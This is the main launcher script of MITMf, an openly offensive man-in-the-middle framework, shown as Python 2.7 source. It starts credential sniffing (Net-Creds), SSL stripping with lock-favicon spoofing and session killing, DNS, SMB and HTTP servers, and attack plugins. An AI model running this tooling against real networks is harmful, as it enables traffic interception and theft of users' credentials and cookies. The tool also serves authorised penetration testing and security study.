#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Gets rid of IPV6 Error when importing scapy
logging.getLogger("requests").setLevel(logging.WARNING) #Disables "Starting new HTTP Connection (1)" log message

import argparse
import sys
import os
import threading
import core.responder.settings as settings

from argparse import RawTextHelpFormatter
from twisted.web import http
from twisted.internet import reactor
from core.logger import logger
from core.banners import get_banner
from plugins import *

print get_banner()

mitmf_version = '0.9.8'
mitmf_codename = 'The Dark Side'

if os.geteuid() != 0:
    sys.exit("[-] The derp is strong with this one")

parser = argparse.ArgumentParser(description="MITMf v{} - '{}'".format(mitmf_version, mitmf_codename), 
                                 version="{} - '{}'".format(mitmf_version, mitmf_codename), 
                                 usage='mitmf.py -i interface [mitmf options] [plugin name] [plugin options]', 
                                 epilog="Use wisely, young Padawan.",
                                 formatter_class=RawTextHelpFormatter)

#add MITMf options
sgroup = parser.add_argument_group("MITMf", "Options for MITMf")
sgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
sgroup.add_argument("-i", dest='interface', type=str, help="Interface to listen on")
sgroup.add_argument("-c", dest='configfile', metavar="CONFIG_FILE", type=str, default="./config/mitmf.conf", help="Specify config file to use")
sgroup.add_argument("-p", "--preserve-cache", action="store_true", help="Don't kill client/server caching")
sgroup.add_argument("-r", '--read-pcap', type=str, help='Parse specified pcap for credentials and exit')
sgroup.add_argument("-l", dest='listen_port', type=int, metavar="PORT", default=10000, help="Port to listen on (default 10000)")
sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")
sgroup.add_argument("-F", "--filter", type=str, help='Filter to apply to incoming traffic')

#Initialize plugins and pass them the parser NameSpace object
plugins = [plugin(parser) for plugin in plugin.Plugin.__subclasses__()]

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

#Set the log level
logger().log_level = logging.__dict__[options.log_level.upper()]

#Check to see if we supplied a valid interface, pass the IP and MAC to the NameSpace object
from core.utils import get_ip, get_mac, shutdown
options.ip  = get_ip(options.interface)
options.mac = get_mac(options.interface)

settings.Config.populate(options)

from core.logger import logger
formatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("MITMf", formatter)

log.debug("MITMf started: {}".format(sys.argv))

#Start Net-Creds
from core.netcreds import NetCreds
NetCreds().start(options.interface, options.ip, options.read_pcap)

from core.sslstrip.CookieCleaner import CookieCleaner
from core.proxyplugins import ProxyPlugins
from core.sslstrip.StrippingProxy import StrippingProxy
from core.sslstrip.URLMonitor import URLMonitor

URLMonitor.getInstance().setFaviconSpoofing(options.favicon)
URLMonitor.getInstance().setCaching(options.preserve_cache)
CookieCleaner.getInstance().setEnabled(options.killsessions)

strippingFactory          = http.HTTPFactory(timeout=10)
strippingFactory.protocol = StrippingProxy

reactor.listenTCP(options.listen_port, strippingFactory)

ProxyPlugins().all_plugins = plugins

print "[*] MITMf v{} - '{}'".format(mitmf_version, mitmf_codename)
for plugin in plugins:

    #load only the plugins that have been called at the command line
    if vars(options)[plugin.optname] is True:

        ProxyPlugins().add_plugin(plugin)

        print "|_ {} v{}".format(plugin.name, plugin.version)
        if plugin.tree_info:
            for line in xrange(0, len(plugin.tree_info)):
                print "|  |_ {}".format(plugin.tree_info.pop())

        plugin.setup_logger()
        plugin.initialize(options)

        if plugin.tree_info:
            for line in xrange(0, len(plugin.tree_info)):
                print "|  |_ {}".format(plugin.tree_info.pop())

        plugin.reactor(strippingFactory)
        plugin.start_config_watch()

print "|"
print "|_ Sergio-Proxy v0.2.1 online"
print "|_ SSLstrip v0.9 by Moxie Marlinspike online"
print "|"

if options.filter:
    from core.packetfilter import PacketFilter
    pfilter = PacketFilter(options.filter)
    pfilter.start()
    print "|_ PacketFilter online"
    print "|  |_ Applying filter {} to incoming packets".format(options.filter)

print "|_ Net-Creds v{} online".format(NetCreds.version)

#Start mitmf-api
from core.mitmfapi import mitmfapi
print "|_ MITMf-API online"
mitmfapi().start()

#Start the HTTP Server
from core.servers.HTTP import HTTP
HTTP().start()
print "|_ HTTP server online"

#Start DNSChef
from core.servers.DNS import DNSChef
DNSChef().start()
print "|_ DNSChef v{} online".format(DNSChef.version)

#Start the SMB server
from core.servers.SMB import SMB
SMB().start()
print "|_ SMB server online\n"

#start the reactor
reactor.run()
print "\n"

if options.filter:
    pfilter.stop()

shutdown()